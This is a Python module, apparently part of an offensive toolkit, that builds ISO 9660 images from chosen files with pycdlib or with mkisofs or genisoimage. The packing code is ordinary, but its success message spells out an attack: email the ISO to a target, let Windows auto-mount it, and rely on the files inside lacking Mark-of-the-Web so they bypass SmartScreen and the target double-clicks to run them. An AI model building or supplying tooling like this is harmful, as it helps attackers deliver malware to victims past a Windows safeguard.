import os
import struct
import datetime
from config import OUTPUT_DIR


def generate_iso(files_to_pack, volume_label="DOCUMENTS", output_filename="document.iso"):
    """
    Generate an ISO 9660 image file.

    Args:
        files_to_pack: list of dict, each element:
            {
                "source_path": "absolute path to local file",
                "name_in_iso": "filename displayed in the ISO"
            }
        volume_label: volume label (disk name shown after mounting)
        output_filename: output ISO filename

    Returns: (success: bool, message: str)
    """
    try:
        return _generate_iso_pycdlib(files_to_pack, volume_label, output_filename)
    except ImportError:
        pass

    try:
        return _generate_iso_system(files_to_pack, volume_label, output_filename)
    except Exception:
        pass

    return False, "ISO generation failed: please install pycdlib (pip install pycdlib)"


def _generate_iso_pycdlib(files_to_pack, volume_label, output_filename):
    """Generate ISO using pycdlib"""
    import pycdlib

    iso = pycdlib.PyCdlib()
    iso.new(
        interchange_level=3,
        joliet=3,
        rock_ridge='1.09',
        vol_ident=volume_label.upper()[:32]
    )

    open_handles = []  # Track open file handles for cleanup

    try:
        for file_info in files_to_pack:
            source_path = file_info["source_path"]
            name_in_iso = file_info["name_in_iso"]

            if not os.path.exists(source_path):
                return False, f"File not found: {source_path}"

            # ISO 9660 filename (8.3 format, uppercase)
            base_name = os.path.splitext(name_in_iso)[0][:8].upper()
            ext = os.path.splitext(name_in_iso)[1][:4].upper()
            if not ext:
                ext = "."
            iso_name = f"/{base_name}{ext};1"

            # Joliet filename (supports long filenames and Unicode)
            joliet_name = f"/{name_in_iso}"

            # Rock Ridge filename
            rr_name = name_in_iso

            fp = open(source_path, 'rb')
            open_handles.append(fp)
            iso.add_fp(
                fp,
                os.path.getsize(source_path),
                iso_path=iso_name,
                joliet_path=joliet_name,
                rr_name=rr_name
            )

        output_path = os.path.join(OUTPUT_DIR, output_filename)
        iso.write(output_path)
        iso.close()
    finally:
        for fp in open_handles:
            try:
                fp.close()
            except Exception:
                pass

    file_size = os.path.getsize(output_path)
    size_str = f"{file_size / 1024:.1f} KB" if file_size < 1048576 else f"{file_size / 1048576:.1f} MB"

    return True, (
        f"ISO image generated: {output_path}\n"
        f"File size: {size_str}\n"
        f"Volume label: {volume_label}\n"
        f"Contains {len(files_to_pack)} file(s)\n\n"
        f"Usage:\n"
        f"1. Send the ISO file to the target via email or file sharing\n"
        f"2. Target double-clicks ISO -> Windows auto-mounts as virtual drive\n"
        f"3. Files inside the mounted ISO do not carry MOTW, bypassing SmartScreen\n"
        f"4. Target sees the files in the virtual drive and double-clicks to execute"
    )


def _generate_iso_system(files_to_pack, volume_label, output_filename):
    """Generate ISO using system commands (mkisofs/genisoimage)"""
    import subprocess
    import shutil
    import tempfile

    temp_dir = tempfile.mkdtemp(prefix="iso_build_")
    try:
        for file_info in files_to_pack:
            source = file_info["source_path"]
            dest_name = file_info["name_in_iso"]
            if not os.path.exists(source):
                return False, f"File not found: {source}"
            shutil.copy2(source, os.path.join(temp_dir, dest_name))

        output_path = os.path.join(OUTPUT_DIR, output_filename)

        for cmd_name in ['mkisofs', 'genisoimage']:
            cmd_path = shutil.which(cmd_name)
            if cmd_path:
                result = subprocess.run([
                    cmd_path, '-J', '-R', '-V', volume_label,
                    '-o', output_path, temp_dir
                ], capture_output=True, text=True, timeout=60)

                if result.returncode == 0 and os.path.exists(output_path):
                    file_size = os.path.getsize(output_path)
                    size_str = f"{file_size/1024:.1f} KB" if file_size < 1048576 else f"{file_size/1048576:.1f} MB"
                    return True, f"ISO image generated ({cmd_name}): {output_path}\nFile size: {size_str}"

        raise Exception("mkisofs or genisoimage not found")

    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)
